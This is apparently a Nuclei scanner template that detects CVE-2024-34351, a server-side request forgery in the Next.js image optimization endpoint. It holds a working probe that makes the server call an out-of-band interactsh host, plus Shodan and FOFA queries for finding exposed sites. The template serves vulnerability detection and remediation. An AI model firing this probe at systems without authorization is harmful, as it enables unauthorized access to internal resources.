http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body
    type: word
    words:
    - The requested resource isn't a valid image
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/_next/image?w=16&q=10&url=http://{{interactsh-url}}'
  - '{{BaseURL}}/_next/image?w=16&q=10&url=https://{{interactsh-url}}'
  stop-at-first-match: true
id: CVE-2024-34351
info:
  author: righettod
  classification:
    cve-id: CVE-2024-34351
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-918
    epss-percentile: 0.99706
    epss-score: 0.9232
  description: 'Next.Js, inferior to version 14.1.1, have its image optimization built-in
    component prone to SSRF.

    '
  impact: 'Unauthenticated attackers can force the Next.js server to make requests
    to arbitrary internal or external resources.

    '
  metadata:
    fofa-query: body="/_next/static"
    max-request: 2
    product: next.js
    shodan-query:
    - http.html:"/_next/static"
    - cpe:"cpe:2.3:a:zeit:next.js"
  name: Next.js - Server Side Request Forgery (SSRF)
  reference:
  - https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
  - https://nvd.nist.gov/vuln/detail/CVE-2024-34351
  - https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g
  - https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085
  - https://github.com/vercel/next.js/pull/62561
  remediation: 'Update Next.js to version 14.1.1 or later.

    '
  severity: high
  tags: cve,cve2024,vercel,nextjs,ssrf,vuln
